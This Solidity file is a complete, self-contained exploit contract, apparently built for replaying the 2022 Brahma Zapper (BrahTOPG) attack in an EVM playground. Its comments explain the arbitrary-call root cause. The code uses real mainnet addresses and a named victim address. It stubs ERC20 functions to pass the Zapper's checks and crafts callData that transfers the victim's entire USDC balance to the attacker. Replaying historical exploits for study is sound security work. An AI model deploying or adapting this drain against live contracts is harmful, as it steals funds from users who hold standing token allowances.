// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-BrahTOPG).
//
// The DeFiHackLabs PoC (test/BrahTOPG_exp.sol) runs the attack INLINE in the
// Foundry ContractTest — the test contract IS the attacker: it poses as the
// `requiredToken` (with stub transferFrom/balanceOf/approve) so it can craft a
// malicious ZapData whose `swapTarget`/`callData` encode
// USDC.transferFrom(victim → this). There is no standalone contract to deploy,
// so this file is a faithful, self-contained copy of that inline attack that
// the playground can deploy and record `run()`.
//
// Root cause: Brahma's Zapper forwards a fully attacker-controlled
// `(swapTarget, callData)` through a raw low-level `.call()` from its own
// address (src_Zapper.sol:143). Any user who holds a standing USDC allowance
// to the Zapper can be drained: the attacker points swapTarget=USDC and
// callData=transferFrom(victim, attacker, victimBalance), and the Zapper —
// which holds near-maxuint allowances — executes it as msg.sender. The
// surrounding zapIn bookkeeping is satisfied by naming THIS contract as
// `requiredToken`: its transferFrom/balanceOf are no-op stubs, and approve()
// pumps 10 wei of FRAX into the Zapper so the balance-delta guard passes.
//
// Drains victim 0xA197…76a3 of 79,679.661825 USDC (their full balance, ≤ the
// standing near-maxuint allowance to the Zapper).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IZapper {
    struct ZapData {
        address requiredToken;
        uint256 amountIn;
        uint256 minAmountOut;
        address allowanceTarget;
        address swapTarget;
        bytes callData;
    }

    function zapIn(ZapData calldata zapCall) external payable;
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BrahTOPGDrain {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IZapper constant ZAPPER = IZapper(0xD248B30A3207A766d318C7A87F5Cf334A439446D);
    address constant VICTIM = 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3;

    function run() external payable {
        // Step 0: acquire a dust amount of FRAX so the Zapper's balance-delta
        // guard (tokenOut = newBalance - oldBalance >= minAmountOut) can be
        // satisfied by pumping 10 wei FRAX in via the stubbed approve() below.
        WETH.deposit{value: 1e15}();
        _wethToFrax();

        // Step 1: read the target amount — the victim's full USDC balance (≤ the
        // standing near-maxuint allowance they granted the Zapper).
        uint256 amount = USDC.balanceOf(VICTIM);

        // Step 2: craft the malicious ZapData. The "swap" is actually a theft:
        // swapTarget=USDC, callData=transferFrom(victim → this, amount).
        // requiredToken/allowanceTarget = THIS contract so the Zapper's
        // bookkeeping calls hit the stubs below and never revert.
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            VICTIM,
            address(this),
            amount
        );
        IZapper.ZapData memory zapData = IZapper.ZapData({
            requiredToken: address(this),
            amountIn: 1,
            minAmountOut: 0,
            allowanceTarget: address(this),
            swapTarget: address(USDC),
            callData: data
        });

        // Step 3: zapIn executes the arbitrary call AS THE ZAPPER, draining the
        // victim's USDC here in a single transaction.
        ZAPPER.zapIn(zapData);
    }

    function _wethToFrax() internal {
        WETH.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FRAX);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETH.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    // --- stubbed IERC20 face so the Zapper treats THIS contract as requiredToken ---
    // transferFrom: no-op (the Zapper pulls `amountIn` of `requiredToken` from the
    // caller; stubbing it true satisfies that pull without moving anything).
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }

    // balanceOf: the Zapper requires balanceOf(zapper) >= amountIn; return 1 so
    // the INPUT_AMOUNT_NOT_RECEIVED check passes.
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    // approve: the Zapper calls inputToken.approve(allowanceTarget, amountIn)
    // before the swap. We hijack it to pump 10 wei FRAX into the Zapper so the
    // wantToken balance-delta guard (newBalance - oldBalance >= minAmountOut)
    // reads tokenOut = 10 >= 0.
    function approve(address, uint256) external returns (bool) {
        FRAX.transfer(address(ZAPPER), 10);
        return true;
    }
}
